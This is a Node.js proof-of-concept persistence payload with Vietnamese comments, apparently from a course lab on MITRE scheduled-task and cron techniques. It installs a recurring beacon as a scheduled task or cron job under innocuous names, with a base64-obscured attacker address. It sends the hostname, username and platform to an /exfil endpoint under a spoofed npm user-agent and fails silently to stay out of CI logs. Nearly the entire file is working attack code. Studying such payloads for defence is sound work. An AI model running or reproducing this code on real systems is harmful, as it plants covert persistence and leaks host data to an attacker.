#!/usr/bin/env node
"use strict";

// [NT230 PoC] Persistence Payload — Stage thêm sau khi secrets đã bị exfil
// Mục đích demo: minh họa T1053.005 (Scheduled Task/Job) và T1053.003 (Cron)
// Chỉ chạy trong môi trường lab/VM cô lập.

const http = require("http");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { execSync } = require("child_process");

let _cfg = {};
try {
  const cfgPath = path.join(__dirname, "config.json");
  _cfg = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
} catch { /* defaults */ }

const ATTACKER_HOST = _cfg.host ||
  Buffer.from("MTcyLjMwLjAuMjA=", "base64").toString("utf8");
const ATTACKER_PORT = _cfg.port || 8080;
const TASK_NAME = "WindowsUpdateHelper";     // tên vô hại để tránh nghi ngờ
const CRON_COMMENT = "# system-update-helper";

// Beacon script nhỏ được ghi ra disk và đăng ký làm persisted task
function buildBeaconScript(host, port) {
  return `"use strict";
const http=require("http");
const r=http.request({hostname:"${host}",port:${port},path:"/beacon",method:"GET"},res=>res.resume());
r.on("error",()=>{});
r.setTimeout(4000,()=>r.destroy());
r.end();
`;
}

// Ghi beacon script ra thư mục temp của hệ thống
function writeBeaconToDisk(host, port) {
  const tmpDir = os.tmpdir();
  const beaconPath = path.join(tmpDir, "svc-node-helper.js");
  fs.writeFileSync(beaconPath, buildBeaconScript(host, port), "utf8");
  return beaconPath;
}

// Windows: đăng ký Scheduled Task chạy mỗi 5 phút
function installWindowsTask(beaconPath) {
  const nodeBin = process.execPath;
  const cmd = [
    "schtasks", "/Create",
    `/TN "${TASK_NAME}"`,
    `/TR "\\"${nodeBin}\\" \\"${beaconPath}\\""`,
    "/SC MINUTE", "/MO 5",
    "/RL HIGHEST",   // chạy với quyền cao nhất hiện có
    "/F",            // ghi đè nếu task đã tồn tại
  ].join(" ");
  execSync(cmd, { timeout: 8000, stdio: "pipe" });
  return { method: "schtasks", task: TASK_NAME, interval: "5min" };
}

// Linux/macOS: thêm vào crontab của user hiện tại
function installCronJob(beaconPath) {
  const nodeBin = process.execPath;
  const entry = `*/5 * * * * "${nodeBin}" "${beaconPath}" ${CRON_COMMENT}`;
  // Lấy crontab hiện tại, thêm entry nếu chưa có
  let existing = "";
  try {
    existing = execSync("crontab -l 2>/dev/null", { timeout: 4000, encoding: "utf8" });
  } catch { /* no existing crontab */ }
  if (!existing.includes(CRON_COMMENT)) {
    const updated = existing.trimEnd() + "\n" + entry + "\n";
    execSync(`echo ${JSON.stringify(updated)} | crontab -`, { timeout: 4000, stdio: "pipe" });
  }
  return { method: "crontab", interval: "*/5 * * * *" };
}

function installPersistence(beaconPath) {
  if (process.platform === "win32") {
    return installWindowsTask(beaconPath);
  }
  return installCronJob(beaconPath);
}

// Báo về attacker server: persistence đã được cài
function notifyPersistence(info) {
  return new Promise((resolve) => {
    const body = JSON.stringify({
      event: "persistence_installed",
      timestamp: new Date().toISOString(),
      platform: process.platform,
      hostname: os.hostname(),
      username: os.userInfo().username,
      persistence: info,
    });
    const req = http.request({
      hostname: ATTACKER_HOST,
      port: ATTACKER_PORT,
      path: "/exfil/persist",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
        "User-Agent": "npm/10.2.3 node/v20.10.0",
      },
    }, (res) => { res.resume(); resolve(); });
    req.setTimeout(5000, () => { req.destroy(); resolve(); });
    req.on("error", () => resolve());
    req.write(body);
    req.end();
  });
}

async function main() {
  try {
    const beaconPath = writeBeaconToDisk(ATTACKER_HOST, ATTACKER_PORT);
    const info = installPersistence(beaconPath);
    await notifyPersistence(info);
  } catch { /* fail-silent — persistence failure không lộ ra CI log */ }
  process.exit(0);
}

main();
